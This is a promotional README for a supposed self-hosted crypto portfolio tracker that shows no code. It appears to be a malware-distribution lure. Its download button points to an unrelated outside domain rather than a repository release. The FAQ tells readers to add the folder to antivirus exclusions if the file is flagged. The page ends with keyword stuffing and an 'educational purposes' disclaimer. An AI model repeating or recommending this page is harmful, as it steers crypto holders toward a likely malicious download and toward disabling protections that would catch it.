# Self-Hosted Crypto Portfolio Tracker 🏦🔒

A private, local-first portfolio tracker for crypto holders who want a single dashboard without handing account access to a third-party service. Balances from centralized exchanges and on-chain wallets land in one view — EVM chains, Solana, and Bitcoin — with cost-basis tracking, real-time PnL, and exports that a tax tool can actually read. Everything runs on your own machine; API keys stay in local config and never leave the process.

[![Download Self-Hosted Crypto Portfolio Tracker](https://img.shields.io/badge/Download-Self--Hosted_Crypto_Portfolio_Tracker-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Chains](https://img.shields.io/badge/chains-12%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Self-Hosted Crypto Portfolio Tracker](#-why-choose-self-hosted-crypto-portfolio-tracker)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt` (or use the Docker image).
3. Add your read-only exchange keys and wallet addresses to `config.yaml`, then start the dashboard.

The dashboard opens at `http://localhost:8080` and syncs balances on first launch.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 4 GB minimum |
| Storage | 300 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Unified Balances**

- 🏦 **CEX + On-Chain** — Binance, Bybit, OKX, KuCoin, Kraken, and others combined with wallet balances in one view.
- 🔗 **12+ Chains** — EVM networks (Ethereum, Arbitrum, Base, Optimism, Polygon), Solana, and Bitcoin-style addresses.
- 🪙 **Token Coverage** — native coins, ERC-20, SPL tokens, and LP positions resolved automatically.
- 🔄 **Auto-Sync** — scheduled refreshes with rate-limit awareness across providers.

**PnL & Cost Basis**

- 📊 **Real-Time PnL** — unrealized and realized gains per asset, per account, and across the whole portfolio.
- 📈 **Cost Basis Methods** — FIFO, LIFO, and average-cost calculation modes.
- 🧾 **Transfer Detection** — internal transfers between your own accounts do not inflate realized PnL.
- 💰 **Fiat Denomination** — display values in USD, EUR, GBP, and other major currencies.

**Analytics**

- 🥧 **Allocation Breakdown** — by asset, chain, account, and category (stablecoins, majors, alts).
- 📉 **Historical Snapshots** — daily portfolio value charts and drawdown tracking.
- 🐋 **Whale Comparison** — benchmark your allocation against top holders for major tokens.

**Privacy & Export**

- 🔐 **Local Keys** — API keys and wallet data stay in local config; nothing is uploaded.
- 📤 **Tax Exports** — CSV and JSON exports compatible with common tax tools.
- 🗂️ **Multi-Account Profiles** — separate profiles for personal, business, or family portfolios.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| cex_connector | Pull balances from exchanges | API keys (read-only) |
| chain_indexer | Wallet balances across 12+ chains | RPC / public indexers |
| pnl_engine | Cost basis and realized/unrealized gains | Web UI |
| analytics | Allocation, snapshots, and drawdowns | Web UI |
| tax_export | CSV and JSON export for tax tools | CLI / Web UI |
| config_manager | Key storage and profile management | YAML / TOML |
| scheduler | Auto-refresh with rate-limit handling | Background job |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Self-Hosted Crypto Portfolio Tracker

- ✅ Local-first by design — keys and balances never leave your machine, so there is no third-party custody risk.
- ✅ CEX and on-chain in one dashboard — no need to reconcile exchange exports with wallet balances manually.
- ✅ Tax-ready output — cost basis, transfer detection, and export formats that a tax tool can actually parse.
- ✅ Multi-chain coverage — EVM, Solana, and Bitcoin-style addresses handled by one indexer layer.
- ✅ Docker and CLI deployment — runs on a laptop, a home server, or a VPS without a dedicated frontend build.

## 💡 Why Use It

- 🔐 Track your whole portfolio without giving account access to a web service.
- 📊 See real PnL with proper cost-basis handling instead of rough exchange estimates.
- 🧾 Generate tax-ready exports at the end of the year in a few clicks.
- 🗂️ Separate personal and business portfolios with independent profiles.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the tracker runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Do I need to share my private keys?**
No — only read-only exchange API keys and public wallet addresses are required.

**How do I update?**
Pull the latest archive and reinstall dependencies — configs and historical data are preserved.

## 🔎 SEO Keywords

Self-Hosted Crypto Portfolio Tracker, self-hosted crypto portfolio, crypto portfolio tracker github, private crypto portfolio tracker, local crypto portfolio tracker, open source portfolio tracker, on-chain portfolio tracker, CEX portfolio tracker, crypto PnL tracker, crypto cost basis tracker, crypto tax export, multi-chain portfolio tracker, crypto portfolio dashboard, self-hosted rotki alternative, self-hosted crypto dashboard, crypto wallet tracker, DeFi portfolio tracker, crypto portfolio docker, privacy crypto tracker, open source crypto tracker

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any exchange or data provider you interact with.
